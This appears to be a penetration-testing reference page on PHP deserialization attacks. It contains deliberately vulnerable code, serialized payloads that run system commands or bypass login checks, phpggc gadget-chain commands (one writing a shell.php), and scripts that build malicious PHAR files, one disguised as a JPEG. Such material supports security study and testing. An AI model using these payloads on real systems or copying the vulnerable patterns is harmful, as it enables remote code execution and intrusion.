# PHP Deserialization

> PHP Object Injection is an application level vulnerability that could allow an attacker to perform different kinds of malicious attacks, such as Code Injection, SQL Injection, Path Traversal and Application Denial of Service, depending on the context. The vulnerability occurs when user-supplied input is not properly sanitized before being passed to the unserialize() PHP function. Since PHP allows object serialization, attackers could pass ad-hoc serialized strings to a vulnerable unserialize() call, resulting in an arbitrary PHP object(s) injection into the application scope.


## Summary

* [General Concept](#general-concept)
* [Authentication Bypass](#authentication-bypass)
* [Object Injection](#object-injection)
* [Finding and Using Gadgets](#finding-and-using-gadgets)
* [Phar Deserialization](#phar-deserialization)
* [Real World Examples](#real-world-examples)
* [References](#references)


## General Concept

The following magic methods will help you for a PHP Object injection

* `__wakeup()` when an object is unserialized.
* `__destruct()` when an object is deleted.
* `__toString()` when an object is converted to a string.

Also you should check the `Wrapper Phar://` in [File Inclusion](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#wrapper-phar) which use a PHP object injection.


Vulnerable code:

```php
<?php 
    class PHPObjectInjection{
        public $inject;
        function __construct(){
        }
        function __wakeup(){
            if(isset($this->inject)){
                eval($this->inject);
            }
        }
    }
    if(isset($_REQUEST['r'])){  
        $var1=unserialize($_REQUEST['r']);
        if(is_array($var1)){
            echo "<br/>".$var1[0]." - ".$var1[1];
        }
    }
    else{
        echo ""; # nothing happens here
    }
?>
```

Craft a payload using existing code inside the application.

* Basic serialized data
    ```php
    a:2:{i:0;s:4:"XVWA";i:1;s:33:"Xtreme Vulnerable Web Application";}
    ```

* Command execution
    ```php
    string(68) "O:18:"PHPObjectInjection":1:{s:6:"inject";s:17:"system('whoami');";}"
    ```


## Authentication Bypass

### Type Juggling

Vulnerable code:

```php
<?php
$data = unserialize($_COOKIE['auth']);

if ($data['username'] == $adminName && $data['password'] == $adminPassword) {
    $admin = true;
} else {
    $admin = false;
}
```

Payload:

```php
a:2:{s:8:"username";b:1;s:8:"password";b:1;}
```

Because `true == "str"` is true.


## Object Injection

Vulnerable code:

```php
<?php
class ObjectExample
{
  var $guess;
  var $secretCode;
}

$obj = unserialize($_GET['input']);

if($obj) {
    $obj->secretCode = rand(500000,999999);
    if($obj->guess === $obj->secretCode) {
        echo "Win";
    }
}
?>
```

Payload:

```php
O:13:"ObjectExample":2:{s:10:"secretCode";N;s:5:"guess";R:2;}
```

We can do an array like this:

```php
a:2:{s:10:"admin_hash";N;s:4:"hmac";R:2;}
```


## Finding and Using Gadgets

Also called `"PHP POP Chains"`, they can be used to gain RCE on the system.

* In PHP source code, look for `unserialize()` function.
* Interesting [Magic Methods](https://www.php.net/manual/en/language.oop5.magic.php) such as `__construct()`, `__destruct()`, `__call()`, `__callStatic()`, `__get()`, `__set()`, `__isset()`, `__unset()`, `__sleep()`, `__wakeup()`, `__serialize()`, `__unserialize()`, `__toString()`, `__invoke()`, `__set_state()`, `__clone()`, and `__debugInfo()`:
    * `__construct()`: PHP allows developers to declare constructor methods for classes. Classes which have a constructor method call this method on each newly-created object, so it is suitable for any initialization that the object may need before it is used. [php.net](https://www.php.net/manual/en/language.oop5.decon.php#object.construct)
    * `__destruct()`: The destructor method will be called as soon as there are no other references to a particular object, or in any order during the shutdown sequence. [php.net](https://www.php.net/manual/en/language.oop5.decon.php#object.destruct)
    * `__call(string $name, array $arguments)`: The `$name` argument is the name of the method being called. The `$arguments` argument is an enumerated array containing the parameters passed to the `$name`'ed method. [php.net](https://www.php.net/manual/en/language.oop5.overloading.php#object.call)
    * `__callStatic(string $name, array $arguments)`: The `$name` argument is the name of the method being called. The `$arguments` argument is an enumerated array containing the parameters passed to the `$name`'ed method. [php.net](https://www.php.net/manual/en/language.oop5.overloading.php#object.callstatic)
    * `__get(string $name)`: `__get()` is utilized for reading data from inaccessible (protected or private) or non-existing properties. [php.net](https://www.php.net/manual/en/language.oop5.overloading.php#object.get)
    * `__set(string $name, mixed $value)`: `__set()` is run when writing data to inaccessible (protected or private) or non-existing properties. [php.net](https://www.php.net/manual/en/language.oop5.overloading.php#object.set)
    * `__isset(string $name)`: `__isset()` is triggered by calling `isset()` or `empty()` on inaccessible (protected or private) or non-existing properties. [php.net](https://www.php.net/manual/en/language.oop5.overloading.php#object.isset)
    * `__unset(string $name)`: `__unset()` is invoked when `unset()` is used on inaccessible (protected or private) or non-existing properties. [php.net](https://www.php.net/manual/en/language.oop5.overloading.php#object.unset)
    * `__sleep()`: `serialize()` checks if the class has a function with the magic name `__sleep()`. If so, that function is executed prior to any serialization. It can clean up the object and is supposed to return an array with the names of all variables of that object that should be serialized. If the method doesn't return anything then **null** is serialized and **E_NOTICE** is issued.[php.net](https://www.php.net/manual/en/language.oop5.magic.php#object.sleep)
    * `__wakeup()`: `unserialize()` checks for the presence of a function with the magic name `__wakeup()`. If present, this function can reconstruct any resources that the object may have. The intended use of `__wakeup()` is to reestablish any database connections that may have been lost during serialization and perform other reinitialization tasks. [php.net](https://www.php.net/manual/en/language.oop5.magic.php#object.wakeup)
    * `__serialize()`: `serialize()` checks if the class has a function with the magic name `__serialize()`. If so, that function is executed prior to any serialization. It must construct and return an associative array of key/value pairs that represent the serialized form of the object. If no array is returned a TypeError will be thrown. [php.net](https://www.php.net/manual/en/language.oop5.magic.php#object.serialize)
    * `__unserialize(array $data)`: this function will be passed the restored array that was returned from __serialize().  [php.net](https://www.php.net/manual/en/language.oop5.magic.php#object.unserialize)
    * `__toString()`: The __toString() method allows a class to decide how it will react when it is treated like a string [php.net](https://www.php.net/manual/en/language.oop5.magic.php#object.tostring)
    * `__invoke()`: The `__invoke()` method is called when a script tries to call an object as a function. [php.net](https://www.php.net/manual/en/language.oop5.magic.php#object.invoke)
    * `__set_state(array $properties)`: This static method is called for classes exported by `var_export()`. [php.net](https://www.php.net/manual/en/language.oop5.magic.php#object.set-state)
    * `__clone()`: Once the cloning is complete, if a `__clone()` method is defined, then the newly created object's `__clone()` method will be called, to allow any necessary properties that need to be changed. [php.net](https://www.php.net/manual/en/language.oop5.cloning.php#object.clone)
    * `__debugInfo()`: This method is called by `var_dump()` when dumping an object to get the properties that should be shown. If the method isn't defined on an object, then all public, protected and private properties will be shown. [php.net](https://www.php.net/manual/en/language.oop5.magic.php#object.debuginfo)


[ambionics/phpggc](https://github.com/ambionics/phpggc) is a tool built to generate the payload based on several frameworks:

- Laravel
- Symfony
- SwiftMailer
- Monolog
- SlimPHP
- Doctrine
- Guzzle

```powershell
phpggc monolog/rce1 'phpinfo();' -s
phpggc monolog/rce1 assert 'phpinfo()'
phpggc swiftmailer/fw1 /var/www/html/shell.php /tmp/data
phpggc Monolog/RCE2 system 'id' -p phar -o /tmp/testinfo.ini
```

## Phar Deserialization

Using `phar://` wrapper, one can trigger a deserialization on the specified file like in `file_get_contents("phar://./archives/app.phar")`.

A valid PHAR includes four elements:

1. **Stub**: The stub is a chunk of PHP code which is executed when the file is accessed in an executable context. At a minimum, the stub must contain `__HALT_COMPILER();` at its conclusion. Otherwise, there are no restrictions on the contents of a Phar stub.
2. **Manifest**: Contains metadata about the archive and its contents.
3. **File Contents**: Contains the actual files in the archive.
4. **Signature**(optional): For verifying archive integrity.


* Example of a Phar creation in order to exploit a custom `PDFGenerator`.
    ```php
    <?php
    class PDFGenerator { }

    //Create a new instance of the Dummy class and modify its property
    $dummy = new PDFGenerator();
    $dummy->callback = "passthru";
    $dummy->fileName = "uname -a > pwned"; //our payload

    // Delete any existing PHAR archive with that name
    @unlink("poc.phar");

    // Create a new archive
    $poc = new Phar("poc.phar");

    // Add all write operations to a buffer, without modifying the archive on disk
    $poc->startBuffering();

    // Set the stub
    $poc->setStub("<?php echo 'Here is the STUB!'; __HALT_COMPILER();");

    /* Add a new file in the archive with "text" as its content*/
    $poc["file"] = "text";
    // Add the dummy object to the metadata. This will be serialized
    $poc->setMetadata($dummy);
    // Stop buffering and write changes to disk
    $poc->stopBuffering();
    ?>
    ```

* Example of a Phar creation with a `JPEG` magic byte header since there is no restriction on the content of stub.
    ```php
    <?php
    class AnyClass {
        public $data = null;
        public function __construct($data) {
            $this->data = $data;
        }
        
        function __destruct() {
            system($this->data);
        }
    }

    // create new Phar
    $phar = new Phar('test.phar');
    $phar->startBuffering();
    $phar->addFromString('test.txt', 'text');
    $phar->setStub("\xff\xd8\xff\n<?php __HALT_COMPILER(); ?>");

    // add object of any class as meta data
    $object = new AnyClass('whoami');
    $phar->setMetadata($object);
    $phar->stopBuffering();
    ```


## Real World Examples

* [Vanilla Forums ImportController index file_exists Unserialize Remote Code Execution Vulnerability - Steven Seeley](https://hackerone.com/reports/410237)
* [Vanilla Forums Xenforo password splitHash Unserialize Remote Code Execution Vulnerability - Steven Seeley](https://hackerone.com/reports/410212)
* [Vanilla Forums domGetImages getimagesize Unserialize Remote Code Execution Vulnerability (critical) - Steven Seeley](https://hackerone.com/reports/410882)
* [Vanilla Forums Gdn_Format unserialize() Remote Code Execution Vulnerability - Steven Seeley](https://hackerone.com/reports/407552)


## References

- [CTF writeup: PHP object injection in kaspersky CTF - Jaimin Gohel - November 24, 2018](https://medium.com/@jaimin_gohel/ctf-writeup-php-object-injection-in-kaspersky-ctf-28a68805610d)
- [ECSC 2019 Quals Team France - Jack The Ripper Web - noraj - May 22, 2019](https://web.archive.org/web/20211022161400/https://blog.raw.pm/en/ecsc-2019-quals-write-ups/#164-Jack-The-Ripper-Web)
- [FINDING A POP CHAIN ON A COMMON SYMFONY BUNDLE: PART 1 - Rémi Matasse - September 12, 2023](https://www.synacktiv.com/publications/finding-a-pop-chain-on-a-common-symfony-bundle-part-1)
- [FINDING A POP CHAIN ON A COMMON SYMFONY BUNDLE: PART 2 - Rémi Matasse - October 11, 2023](https://www.synacktiv.com/publications/finding-a-pop-chain-on-a-common-symfony-bundle-part-2)
- [Finding PHP Serialization Gadget Chain - DG'hAck Unserial killer - xanhacks - August 11, 2022](https://www.xanhacks.xyz/p/php-gadget-chain/#introduction)
- [How to exploit the PHAR Deserialization Vulnerability - Alexandru Postolache - May 29, 2020](https://pentest-tools.com/blog/exploit-phar-deserialization-vulnerability/)
- [phar:// deserialization - HackTricks - July 19, 2024](https://book.hacktricks.xyz/pentesting-web/file-inclusion/phar-deserialization)
- [PHP deserialization attacks and a new gadget chain in Laravel - Mathieu Farrell - February 13, 2024](https://blog.quarkslab.com/php-deserialization-attacks-and-a-new-gadget-chain-in-laravel.html)
- [PHP Generic Gadget - Charles Fol - July 4, 2017](https://www.ambionics.io/blog/php-generic-gadget-chains)
- [PHP Internals Book - Serialization - jpauli - June 15, 2013](http://www.phpinternalsbook.com/classes_objects/serialization.html)
- [PHP Object Injection - Egidio Romano - April 24, 2020](https://www.owasp.org/index.php/PHP_Object_Injection)
- [PHP Pop Chains - Achieving RCE with POP chain exploits. - Vickie Li - September 3, 2020](https://vkili.github.io/blog/insecure%20deserialization/pop-chains/)
- [PHP unserialize - php.net - March 29, 2001](http://php.net/manual/en/function.unserialize.php)
- [POC2009 Shocking News in PHP Exploitation - Stefan Esser - May 23, 2015](https://web.archive.org/web/20150523205411/https://www.owasp.org/images/f/f6/POC2009-ShockingNewsInPHPExploitation.pdf)
- [Rusty Joomla RCE Unserialize overflow - Alessandro Groppo - October 3, 2019](https://blog.hacktivesecurity.com/index.php/2019/10/03/rusty-joomla-rce/)
- [TSULOTT Web challenge write-up - MeePwn CTF - Rawsec - July 15, 2017](https://web.archive.org/web/20211022151328/https://blog.raw.pm/en/meepwn-2017-write-ups/#TSULOTT-Web)
- [Utilizing Code Reuse/ROP in PHP - Stefan Esser - June 15, 2020](http://web.archive.org/web/20200615044621/https://owasp.org/www-pdf-archive/Utilizing-Code-Reuse-Or-Return-Oriented-Programming-In-PHP-Application-Exploits.pdf)